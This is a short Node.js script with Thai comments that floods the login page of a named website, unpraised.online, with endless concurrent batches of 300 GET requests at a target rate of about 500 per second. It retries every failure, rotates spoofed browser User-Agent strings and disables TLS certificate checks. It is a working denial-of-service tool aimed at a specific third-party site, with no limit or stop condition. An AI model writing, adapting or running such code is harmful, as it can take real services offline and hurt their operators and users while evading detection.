const axios = require("axios");
const axiosRetry = require("axios-retry").default;
const https = require("https");

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
const agent = new https.Agent({ rejectUnauthorized: false });

axiosRetry(axios, {
  retries: 3,
  retryDelay: (retryCount) => retryCount * 500,
  retryCondition: () => true,
});

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
];

const URL = "https://unpraised.online/login.php";

const BATCH_SIZE = 300; // ✅ ยิงทีละ 300 requests
const TARGET_PER_SECOND = 500;
const DELAY_BETWEEN_BATCH = 1000 * BATCH_SIZE / TARGET_PER_SECOND; // ≈ 600ms

function randomDelay(min = 10, max = 50) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

async function fireBatch(batchNum) {
  console.log(`🚀 ชุดที่ ${batchNum} ยิงพร้อมกัน ${BATCH_SIZE} requests`);

  const tasks = Array.from({ length: BATCH_SIZE }, async (_, i) => {
    await new Promise(r => setTimeout(r, randomDelay()));
    const start = Date.now();
    try {
      const res = await axios.get(URL, {
        httpsAgent: agent,
        headers: {
          "User-Agent": getRandomUserAgent(),
          Accept: "text/html",
        },
        timeout: 5000,
        responseType: "text",
      });
      const duration = Date.now() - start;
      console.log(`✅ (${batchNum}-${i + 1}) status: ${res.status} | เวลา: ${duration}ms`);
    } catch (err) {
      console.error(`❌ (${batchNum}-${i + 1}) ล้มเหลว: ${err.message}`);
    }
  });

  await Promise.all(tasks);
}

async function loopBatches() {
  let batch = 1;
  while (true) {
    await fireBatch(batch++);
    await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_BATCH));
  }
}

loopBatches();
